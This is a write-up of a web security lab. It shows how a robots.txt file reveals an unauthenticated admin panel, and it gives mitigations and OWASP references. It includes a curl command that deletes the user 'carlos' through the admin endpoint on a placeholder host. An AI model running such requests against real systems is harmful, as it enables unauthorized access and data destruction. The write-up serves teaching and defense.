# 🛡️ Unprotected Admin Functionality – robots.txt Disclosure

[![Lab Type](https://img.shields.io/badge/Lab-Web_Exploit-blue)](https://github.com/)  
[![Severity](https://img.shields.io/badge/Severity-High-red)](https://github.com/)  
[![Impact](https://img.shields.io/badge/Impact-Account_Compromise-orange)](https://owasp.org/)  
[![robots.txt](https://img.shields.io/badge/Weakness-robots.txt-lightgrey)](https://owasp.org/)  
[![Admin Panel](https://img.shields.io/badge/Feature-Admin_Panel-yellow)](https://owasp.org/)  

---

## 📑 Table of Contents

1. [Overview](#overview)  
2. [Objective](#objective)  
3. [Vulnerability Description](#vulnerability-description)  
4. [Exploitation Steps](#exploitation-steps)  
5. [Proof of Exploit](#proof-of-exploit)  
6. [Proof of Concept](#proof-of-concept)  
7. [Mitigation](#mitigation)  
8. [References](#references)  

---

## Overview

This lab demonstrates how **unprotected admin functionality** can be discovered via `robots.txt`. By following a disallowed path, an attacker gains direct access to the administrator panel and can perform unauthorized actions such as account deletion.  

---

## Objective

- Understand how sensitive functionality may be exposed through `robots.txt`  
- Learn why access control is essential even for hidden paths  
- Practice exploiting weak or missing authorization controls  

---

## Vulnerability Description

The `robots.txt` file is meant to guide search engine crawlers, but it should **never be used to hide sensitive paths**.  

In this lab:  
- `/robots.txt` disclosed a hidden `/administrator-panel` path  
- The admin panel was accessible without authentication  
- Attackers could perform destructive actions, including deleting users  

---

## Exploitation Steps

1. Access `robots.txt` at the lab root:  

   ```
   GET /robots.txt HTTP/1.1
   Host: target.com
   ```

   Response:  
   ```
   User-agent: *
   Disallow: /administrator-panel
   ```

2. Navigate to `/administrator-panel`.  
3. The admin panel loads without login.  
4. Select target user (`carlos`) and delete the account.  

---

## PROOF OF EXPLOIT

```

<img width="1917" height="1079" alt="Unprotected admin functionality" src="https://github.com/user-attachments/assets/6e414a59-b9d1-48a2-a28b-919f6cd862c7" />

```

Response:  
```
HTTP/1.1 200 OK
User carlos deleted successfully
```

---

## Proof of Concept

Using `curl` to delete **carlos** directly:  

```bash
curl -X POST "http://target.com/administrator-panel/delete" \
     -d "username=carlos"
```

---

## Mitigation

* **Do not rely on `robots.txt`** for security; it should never disclose sensitive paths  
* **Enforce authentication & authorization** on all admin functionality  
* **Implement role-based access control (RBAC)**  
* **Log and monitor admin activity** to detect abuse  

---

## References

* [OWASP: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)  
* [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)  
* [Google robots.txt Specification](https://developers.google.com/search/docs/crawling-indexing/robots/intro)  
